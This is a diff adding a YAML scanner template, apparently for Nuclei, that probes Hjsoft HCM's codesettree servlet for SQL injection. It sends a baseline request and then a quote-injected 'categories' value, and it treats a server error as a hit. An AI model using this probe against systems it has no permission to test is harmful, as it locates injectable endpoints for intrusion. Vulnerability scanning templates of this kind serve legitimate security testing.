@@ -1,0 +1,31 @@
+id: poc-yaml-hjsoft-hcm-codesettree-serlvet-categories-sqli
+
+info:
+  name: poc-yaml-hjsoft-hcm-codesettree-serlvet-categories-sqli
+  author: chaitin
+  severity: medium
+  tags: xray-converted,sqli
+  reference:
+    - https://stack.chaitin.com/techblog/detail?id=89
+
+http:
+  - raw:
+      - |
+        GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /servlet/codesettree?flag=c&status=1&codesetid=1&parentid=-1&categories=~31~27~ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
